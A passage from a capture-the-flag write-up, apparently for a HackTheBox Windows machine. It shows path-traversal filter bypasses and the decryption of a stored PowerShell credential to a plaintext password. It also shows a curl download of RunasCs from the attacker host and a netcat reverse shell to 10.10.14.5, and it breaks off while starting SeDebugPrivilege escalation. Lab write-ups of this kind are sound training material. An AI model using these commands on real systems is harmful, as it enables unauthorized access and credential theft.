class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Source Code:</strong></span></span></p></div><div id="https://www.notion.so/db865936968c4581a171e4c3dd596606" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I checked the web’s index file, and found the download function I exploited earlier with LFI.</span></span></p></div><div id="https://www.notion.so/efeff2e58a574719aa3b12d019097223" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\inetpub\wwwroot\dev\portfolio\index.aspx.cs</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/6183f419912a4e33bc51f05a41972d8d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Collections<span class="token punctuation">.</span>Generic</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Web</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Web<span class="token punctuation">.</span>UI</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Web<span class="token punctuation">.</span>UI<span class="token punctuation">.</span>WebControls</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>RegularExpressions</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Text</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>IO</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">index</span> <span class="token punctuation">:</span> <span class="token type-list"><span class="token class-name">System<span class="token punctuation">.</span>Web<span class="token punctuation">.</span>UI<span class="token punctuation">.</span>Page</span></span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Page_Load</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sender<span class="token punctuation">,</span> <span class="token class-name">EventArgs</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>
    
    <span class="token keyword">protected</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Download</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sender<span class="token punctuation">,</span> <span class="token class-name">EventArgs</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            
        <span class="token class-name"><span class="token keyword">var</span></span> filePath <span class="token operator">=</span> file<span class="token punctuation">.</span>Value<span class="token punctuation">;</span>
        filePath <span class="token operator">=</span> Regex<span class="token punctuation">.</span><span class="token function">Replace</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> <span class="token string">"../"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Response<span class="token punctuation">.</span>ContentType <span class="token operator">=</span> <span class="token string">"application/octet-stream"</span><span class="token punctuation">;</span>
        Response<span class="token punctuation">.</span><span class="token function">AppendHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition"</span><span class="token punctuation">,</span><span class="token string">"attachment; filename="</span> <span class="token operator">+</span> filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Response<span class="token punctuation">.</span><span class="token function">TransmitFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Response<span class="token punctuation">.</span><span class="token function">End</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></span></span></span></code></pre><div id="https://www.notion.so/95b2d812377543ed88f166766c043539" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It actually have some sort of LFI protection, removing </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">../</code></span><span class="SemanticString"> from the user-provided file path. But I can think of at least three ways to bypass this:</span></span></p></div><div id="https://www.notion.so/32e265d4be3c474e81ee9c2a83d32877" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/74aebacb82fc43c4b8a62f77f92e6082" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Method 1 — Backslashes: Since it’s a Windows machine, backslashes (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">\</code></span><span class="SemanticString">) can also be used in file paths. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">..\</code></span><span class="SemanticString"> can still be used to traverse directories, which is what I did earlier to read the web config.</span></span></p></div><div id="https://www.notion.so/9f06f79ace5d4b6bb49e3eda83e11ebb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2e56a2ec106141029424697ff9cf5f02" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Method 2 — Non-Recursive Filters: The </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">../</code></span><span class="SemanticString"> filter is only run once in the code, and not recursively. Hence, something like </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">....//</code></span><span class="SemanticString"> would result back in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">../</code></span><span class="SemanticString"> after the filter, and I can set the file path as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">....//web.config</code></span><span class="SemanticString"> and still be able to read the file.</span></span></p></div><div id="https://www.notion.so/ba68e43c15df4eefba22b8799bd1345a" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1fe65b58-baa8-449e-986d-61fab9628e9b%2FUntitled.png?width=1628&amp;table=block&amp;id=ba68e43c-15df-4eef-ba22-b8799bd1345a"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1fe65b58-baa8-449e-986d-61fab9628e9b%2FUntitled.png?width=1628&amp;table=block&amp;id=ba68e43c-15df-4eef-ba22-b8799bd1345a" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/c9e7299e72a24ea5946e3fd7157375ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Method 3 — Full Path: The app does not prepend anything to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">filePath</code></span><span class="SemanticString">, so I can simply provide the full path and read </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\Windows\System32\drivers\etc\hosts</code></span><span class="SemanticString"> for example:</span></span></p></div><div id="https://www.notion.so/e98f19228ce54f2ca96072f992a0e200" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa09934d4-997d-4d18-8055-003867058fa6%2FUntitled.png?width=1621&amp;table=block&amp;id=e98f1922-8ce5-4f2c-a960-72f992a0e200"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa09934d4-997d-4d18-8055-003867058fa6%2FUntitled.png?width=1621&amp;table=block&amp;id=e98f1922-8ce5-4f2c-a960-72f992a0e200" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/ff886dd3b55f41928d0933b91306a747" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Apart from this, there’s nothing much to find in the web folder.</span></span></p></div><div id="https://www.notion.so/f9b5633547c845609d2150016a6005c9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/7f53e1d8dcb34bacbd1a7194d436c1fb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">PSCredentials:</strong></span></span></p></div><div id="https://www.notion.so/8d9531ce0f3c4ad9a423859e4ec57d9f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s an XML file found in the user’s </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">documents</code></span><span class="SemanticString"> folder:</span></span></p></div><pre id="https://www.notion.so/12c937fc6c6e49c9951db527517539fd" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\sfitz\documents&gt;</span></mark></span><span class="SemanticString"><span> dir

    Directory: C:\users\sfitz\documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/25/2023   2:26 PM           1838 connection.xml</span></span></span></code></pre><div id="https://www.notion.so/b27f062fb8f34084b758327b9a1dfe0b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It seems to contain encrypted credentials for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">alaading</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/0aa132c499ba465abcaa1bb29232f80d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Objs</span> <span class="token attr-name">Version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1.0.1<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.microsoft.com/powershell/2004/04<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Obj</span> <span class="token attr-name">RefId</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TN</span> <span class="token attr-name">RefId</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>T</span><span class="token punctuation">></span></span>System.Management.Automation.PSCredential<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>T</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>T</span><span class="token punctuation">></span></span>System.Object<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>T</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TN</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ToString</span><span class="token punctuation">></span></span>System.Management.Automation.PSCredential<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ToString</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Props</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>S</span> <span class="token attr-name">N</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UserName<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>alaading<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>S</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SS</span> <span class="token attr-name">N</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SS</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Props</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Obj</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Objs</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/172501eaafcd41c99a09b0505cde1472" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.4.0">PSCredential</a></span><span class="SemanticString"> is a PowerShell class for managing credentials, and can be passed to other cmdlets and functions as an object. The password itself is encrypted in memory as a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-8.0">SecureString</a></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/2f3b36f5b0c64f84a65544cd31eeaf01" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The user probably exported the PSCredential object into an XML file using </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml?view=powershell-7.4">Export-Clixml</a></span><span class="SemanticString">, and according to </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://systemweakness.com/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8">this post</a></span><span class="SemanticString">, the password can also be decrypted with a few PowerShell commands.</span></span></p></div><pre id="https://www.notion.so/6d7e32e8104c4a1d8d1796b7bc951691" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\sfitz\documents&gt;</span></mark></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorDefault"><span> powershell

Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.</span></mark></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>

C:\users\sfitz\documents&gt;</span></mark></span><span class="SemanticString"><span> $user = &quot;alaading&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\sfitz\documents&gt;</span></mark></span><span class="SemanticString"><span> $pass = &quot;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&quot; | ConvertTo-SecureString

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\sfitz\documents&gt;</span></mark></span><span class="SemanticString"><span> $cred = New-Object System.Management.Automation.PSCredential($user, $pass)

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\sfitz\documents&gt;</span></mark></span><span class="SemanticString"><span> $cred.GetNetworkCredential() | fl

UserName       : alaading
Password       : f8gQ8fynP44ek1m3
SecurePassword : System.Security.SecureString
Domain         :</span></span></span></code></pre><div id="https://www.notion.so/cd469798eec9401fa1e70ee2518f2cc7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the password, I can spawn a shell session as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">alaading</code></span><span class="SemanticString"> using </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/antonioCoco/RunasCs">RunasCs</a></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/cb8535f1b91e46a18ba493d9980ba011" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\sfitz\desktop&gt;</span></mark></span><span class="SemanticString"><span> curl http://10.10.14.5:8000/RunasCs.exe -o RunasCs.exe

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\sfitz\desktop&gt;</span></mark></span><span class="SemanticString"><span> .\RunasCs.exe -h

RunasCs v1.5 - @splinter_code

Usage:
    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]

Description:
    RunasCs is an utility to run specific processes under a different user account
    by specifying explicit credentials. In contrast to the default runas.exe command
    it supports different logon types and CreateProcess* functions to be used, depending
    on your current permissions. Furthermore it allows input/output redirection (even
    to remote hosts) and you can specify the password directly on the command line.

Positional arguments:
    username                username of the user
    password                password of the user
    cmd                     commandline for the process

Optional arguments:
    -d, --domain domain
                            domain of the user, if in a domain. 
                            Default: &quot;&quot;
    -f, --function create_process_function
                            CreateProcess function to use. When not specified
                            RunasCs determines an appropriate CreateProcess
                            function automatically according to your privileges.
                            0 - CreateProcessAsUserW
                            1 - CreateProcessWithTokenW
                            2 - CreateProcessWithLogonW
    -l, --logon-type logon_type
                            the logon type for the token of the new process.
                            Default: &quot;2&quot; - Interactive
    -t, --timeout process_timeout
                            the waiting time (in ms) for the created process.
                            This will halt RunasCs until the spawned process
                            ends and sent the output back to the caller.
                            If you set 0 no output will be retrieved and a 
                            background process will be created.
                            Default: &quot;120000&quot;
    -r, --remote host:port
                            redirect stdin, stdout and stderr to a remote host.
                            Using this option sets the process_timeout to 0.
    -p, --force-profile
                            force the creation of the user profile on the machine.
                            This will ensure the process will have the
                            environment variables correctly set.
                            WARNING: If non-existent, it creates the user profile
                            directory in the C:\Users folder.
    -b, --bypass-uac     
                            try a UAC bypass to spawn a process without
                            token limitations (not filtered).
    -i, --remote-impersonation     
                            spawn a new process and assign the token of the 
                            logged on user to the main thread.

Examples:
    Run a command as a local user
        RunasCs.exe user1 password1 &quot;cmd /c whoami /all&quot;
    Run a command as a domain user and logon type as NetworkCleartext (8)
        RunasCs.exe user1 password1 &quot;cmd /c whoami /all&quot; -d domain -l 8
    Run a background process as a local user,
        RunasCs.exe user1 password1 &quot;C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe&quot; -t 0
    Redirect stdin, stdout and stderr of the specified command to a remote host
        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
    Run a command simulating the /netonly flag of runas.exe 
        RunasCs.exe user1 password1 &quot;cmd /c whoami /all&quot; -l 9
    Run a command as an Administrator bypassing UAC
        RunasCs.exe adm1 password1 &quot;cmd /c whoami /priv&quot; --bypass-uac
    Run a command as an Administrator through remote impersonation
        RunasCs.exe adm1 password1 &quot;cmd /c echo admin &gt; C:\Windows\admin&quot; -l 8 --remote-impersonation</span></span></span></code></pre><div id="https://www.notion.so/4a975c85639f46438fe942d235e83bcb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll use the uploaded nc binary once again. Also I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-t 0</code></span><span class="SemanticString"> for a background process so that I keep my current shell.</span></span></p></div><pre id="https://www.notion.so/6ad9be340fb34aa2b7fefca15eb56ebe" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\sfitz\desktop&gt;</span></mark></span><span class="SemanticString"><span> icacls c:\windows\temp\nc64.exe /grant Everyone:F

processed file: c:\windows\temp\nc64.exe
Successfully processed 1 files; Failed processing 0 files

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\sfitz\desktop&gt;</span></mark></span><span class="SemanticString"><span> .\RunasCs.exe alaading f8gQ8fynP44ek1m3 &quot;cmd /c c:\\windows\\temp\\nc64.exe 10.10.14.5 8001 -e cmd&quot; -t 0

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-a4676$\Default
[+] Async process &#x27;C:\Windows\system32\cmd.exe /c c:\\windows\\temp\\nc64.exe 10.10.14.5 8001 -e cmd&#x27; with pid 4496 created in background.</span></span></span></code></pre><div id="https://www.notion.so/8e074905b71b40baa80b58227260cdfd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Once executed, a shell got sent back almost immediately.</span></span></p></div><pre id="https://www.notion.so/5dc006aa4a7f469f9420cd4bbbce49d9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/pov]
└─$</span></mark></span><span class="SemanticString"><span> sudo nc -lvnp 8001

listening on [any] 8001 ...
connect to [10.10.14.5] from (UNKNOWN) [10.129.154.68] 49685
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\windows\system32&gt;</span></mark></span><span class="SemanticString"><span> whoami

pov\alaading</span></span></span></code></pre><div id="https://www.notion.so/a088654b986343dea492cf6567016bac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/519e64cedc054333b5f1d3ff340278a1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/1ec0520dcc9248c5a3216be351ff39b9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\alaading\desktop&gt;</span></mark></span><span class="SemanticString"><span> type user.txt

4a0f83e1************************</span></span></span></code></pre><div id="https://www.notion.so/89a1c333887f46638535e0ac1ddbff0a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/326ae9855f1446f183fc2869100680e2" class="Divider"></div><h3 id="https://www.notion.so/5bece571fd8c4c06af77a9a8f0dd4c7d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/5bece571fd8c4c06af77a9a8f0dd4c7d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">alaading</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/9e427838eec34faab8c089a59e49e952" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Privileges:</strong></span></span></p></div><pre id="https://www.notion.so/51eecad0390b47fb857d6436d64ab4c5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\alaading\desktop&gt;</span></mark></span><span class="SemanticString"><span> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span></span></span></code></pre><div id="https://www.notion.so/53b746be8a0d44fea04f46d5221d67f1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SeDebugPrivilege</code></span><span class="SemanticString"> immediately catches my eyes. Users with this privilege can debug other processes, including the ability to read into memory and inject commands. We can abuse these privileges to takeover SYSTEM processes such as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">winlogon.exe</code></span><span class="SemanticString"> or </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">lsass.exe</code></span><span class="SemanticString">, which enables us to access sensitive data or even gain a SYSTEM shell.</span></span></p></div><div id="https://www.notion.so/e0c8b16d3c774f6cbe498b55ed13c7e1" class="Bookmark"><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens"><h5 class="Bookmark__Title">Abusing Tokens</h5><p class="Bookmark__Link">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</p></a></div><div id="https://www.notion.so/a0b5bbf5f23f487fb1acd402b6bd0e61" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The privilege is currently disabled though, but there’s multiple ways to re-enable it.</span></span></p></div><div id="https://www.notion.so/9d07a4b240e9420fa46facf2b03227dd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/7fb000f68f8a421ca053f6a83a1836cd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Option 1: EnableAllTokenPrivs.ps1</strong></span></span></p></div><div id="https://www.notion.so/6f33dd29422c49b7ac58ea0147adf393" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Also mentioned in the HackTricks post above, there’s a PowerShell script </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/fashionproof/EnableAllTokenPrivs/tree/master">EnableAllTokenPrivs.ps1</a></span><span class="SemanticString"> that re-enables every privileges we have.</span></span></p></div><pre id="https://www.notion.so/be6152575aad48b19dc0f11e0103c828" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor 